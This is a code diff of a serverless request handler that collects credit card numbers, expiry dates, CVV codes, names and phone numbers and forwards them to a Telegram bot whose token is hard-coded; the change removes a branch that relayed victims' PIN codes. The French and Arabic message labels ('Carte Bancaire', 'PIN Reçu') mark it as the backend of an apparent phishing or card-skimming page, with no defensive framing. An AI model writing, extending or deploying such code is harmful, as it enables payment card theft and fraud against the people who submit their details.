@@ -16,7 +16,6 @@ export default async function handler(req, res) {
     cc,
     exp,
     cvv,
-    pin_code
   } = req.body;
 
   const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM";
@@ -24,15 +23,7 @@ export default async function handler(req, res) {
 
   let message = "";
   
-if (pin_code) {
-    // 🟣 رسالة PIN
-    message = `
-🔑 PIN Reçu:
-- Code: ${pin_code}
-- Nom: ${first_name || ""} ${last_name || ""}
-- Téléphone: ${num || ""}
-    `;
-}else if  (cc && exp && cvv) {
+  if  (cc && exp && cvv) {
     // 🟢 رسالة الكارت
     message = `
 💳 Carte Bancaire:
@@ -75,6 +66,7 @@ if (pin_code) {
     res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
+
 
 
 
